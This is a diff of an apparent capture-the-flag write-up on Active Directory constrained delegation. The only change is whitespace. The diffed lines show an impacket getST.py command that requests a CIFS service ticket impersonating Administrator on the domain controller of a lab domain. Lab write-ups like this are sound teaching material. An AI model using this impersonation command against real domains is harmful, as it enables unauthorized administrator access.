@@ -79,9 +79,9 @@ We found that svc.scanner has a constrained delegation relationship "AllowedToDe
 so we request a service ticket for CIFS as Administrator.                  CIFS is the service giving the DC file-system access
 
 
-1. Request a service ticket for CIFS impersonating Administrator 
-   `impacket/getST.py ctf.local/svc.scanner -spn cifs/DC01.CTF.LOCAL -impersonate 'Administrator' -dc-ip <DC_IP>` 
-	          -this will give us the TGS for CIFS stored in a .ccache file
+1. Request a service ticket for CIFS impersonating Administrator                                                                                                  
+   `impacket/getST.py ctf.local/svc.scanner -spn cifs/DC01.CTF.LOCAL -impersonate 'Administrator' -dc-ip <DC_IP>`                                                 
+	           -this will give us the TGS for CIFS stored in a .ccache file
    <img width="1247" height="222" alt="image" src="https://github.com/user-attachments/assets/a2496d9f-3d6d-4af1-89ea-1f9f71a9c815" />
 
 	
